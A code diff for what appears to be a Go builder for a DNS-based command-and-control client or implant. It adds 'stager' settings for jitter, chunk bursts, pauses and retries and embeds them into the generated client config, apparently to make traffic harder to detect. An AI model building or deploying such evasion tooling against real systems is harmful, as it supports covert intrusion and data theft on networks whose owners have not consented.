@@ -43,6 +43,14 @@ type BuildConfig struct {
 		SleepMin         int    `json:"sleep_min"`
 		SleepMax         int    `json:"sleep_max"`
 	} `json:"client"`
+	Stager struct {
+		JitterMinMs       int `json:"jitter_min_ms"`
+		JitterMaxMs       int `json:"jitter_max_ms"`
+		ChunksPerBurst    int `json:"chunks_per_burst"`
+		BurstPauseMs      int `json:"burst_pause_ms"`
+		RetryDelaySeconds int `json:"retry_delay_seconds"`
+		MaxRetries        int `json:"max_retries"`
+	} `json:"stager"`
 	Security struct {
 		EncryptionKey string `json:"encryption_key"`
 	} `json:"security"`
@@ -189,6 +197,14 @@ func tryLoadEmbeddedConfig() (Config, bool) {
 		UpstreamDNS:   %q,
 		EncryptionKey: %q,
 		Debug:         %t,
+		StagerJitter: StagerJitter{
+			JitterMinMs:       %d,
+			JitterMaxMs:       %d,
+			ChunksPerBurst:    %d,
+			BurstPauseMs:      %d,
+			RetryDelaySeconds: %d,
+			MaxRetries:        %d,
+		},
 	}
 	return embeddedConfig, true
 }`,
@@ -202,6 +218,12 @@ func tryLoadEmbeddedConfig() (Config, bool) {
 		config.Server.UpstreamDNS,
 		config.Security.EncryptionKey,
 		config.Server.Debug,
+		config.Stager.JitterMinMs,
+		config.Stager.JitterMaxMs,
+		config.Stager.ChunksPerBurst,
+		config.Stager.BurstPauseMs,
+		config.Stager.RetryDelaySeconds,
+		config.Stager.MaxRetries,
 	)
 
 	// Replace the stub function in config.go
